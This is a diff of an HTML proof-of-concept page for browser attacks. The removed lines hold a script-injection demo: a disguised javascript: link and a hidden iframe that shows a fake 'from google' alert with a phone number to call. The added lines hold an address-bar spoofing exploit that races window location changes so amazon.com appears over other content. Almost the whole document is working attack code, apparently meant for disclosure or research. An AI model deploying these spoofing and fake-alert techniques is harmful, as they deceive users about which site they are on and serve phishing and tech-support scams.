@@ -1,36 +1,31 @@
-
-<!DOCTYPE HTML>
-<html lang="en-US">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title>Script injection</title>
-	
-	<style>
-		iframe {
-			visibility: hidden;
-		}
-	</style>
-   
-	<script>
-		function redirect() {
-			setTimeout(function() {
-				window.open("https://google.com/load/", "win");
-			}, 1500);
-		}
-   		
-		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:alert('This is from google. call +6128282 to cal us! ');";
-		}
-	</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
 <body>
-   <center>
-		<br>
-		<h1><a href="o.o:@javascript:://google.com/error/%0Aalert(document.domain)//.https://google.com/load/webpage/133337" target="win" onclick="redirect();">Click here to go to https://google.com</a></h1>
-	</center>
-   <iframe id="iframe"></iframe>
+    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
 </body>
+    
+    <script>
+    
+    let windowSpoof;
 
-</html>
+    function race() {
+      try {
+        windowSpoof.location.href !== 'about:blank';
+      }
+      catch (e) {
+        windowSpoof.location.href='https://www.google.com/csi';
+      }
+    }
+    
+    function startSpoof() {
+
+      windowSpoof = window.open("https://www.google.com:82","x");
+      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+
+      setInterval('race()', 0);
+    
+    }
+   
+    </script>
